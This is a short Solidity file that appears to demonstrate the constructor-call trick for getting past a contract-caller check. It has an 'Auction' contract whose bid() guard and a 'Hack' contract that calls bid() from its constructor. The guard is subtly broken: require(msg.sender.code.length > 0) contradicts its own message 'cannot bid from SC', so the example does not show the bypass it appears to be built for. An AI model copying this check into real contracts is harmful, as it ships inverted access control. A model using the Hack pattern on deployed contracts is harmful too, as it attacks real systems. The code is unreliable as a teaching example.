// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract Auction {
  function bid() external {
    require(msg.sender.code.length > 0, "cannot bid from SC");
  }
}

contract Hack {
  Auction toHack;

  constructor(address _toHack) payable {
    toHack = Auction(_toHack);
    toHack.bid();
  }
}